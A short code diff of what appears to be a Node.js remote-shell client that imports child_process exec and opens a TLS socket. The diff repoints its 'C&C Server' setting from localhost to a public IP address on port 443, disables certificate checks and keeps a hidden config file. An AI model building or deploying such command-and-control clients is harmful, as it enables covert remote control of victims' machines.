@@ -2,30 +2,21 @@
 // Core Modules
 const tls = require('tls')
 const fs = require('fs')
-const child = require('child_process')
 const { exec } = require('child_process');
 // ===========================================================================
 
-/**
- * options object stores the private key and public cert to be used by tls socket for traffic encryption.
- */
+// Global variables
+const _comPort = 443 // Communication Socket port
+const _host = '51.222.157.180' // C&C Server
+const _EOT_ = '|||' // Characters to identify end of transmission per write (not per packet)
+const _CONFIG_PATH_ = '/.RSconf'
+
 const _options = {
     key: fs.readFileSync(__dirname + '/certs/host.key'),
     cert: fs.readFileSync(__dirname + '/certs/host.crt'),
     rejectUnauthorized: false
 }
 
-// flag variable to let the client know if it needs to reconnect to the server
-const _fsPort = 2223 // File socket port
-const _comPort = 443 // Communication Socket port
-const _host = '127.0.0.1' // C&C Server
-const _shellType = "sh" //cmd.exe, zsh, sh
-const _EOT_ = '|||' // Characters to identify end of transmission per write (not per packet)
-const _CONFIG_PATH_ = '/.RSconf'
-// ===========================================================================
-
-// Global variables
-var comAlive = false
 var workstationId
 var buffer = ''
 var fileStream = {}
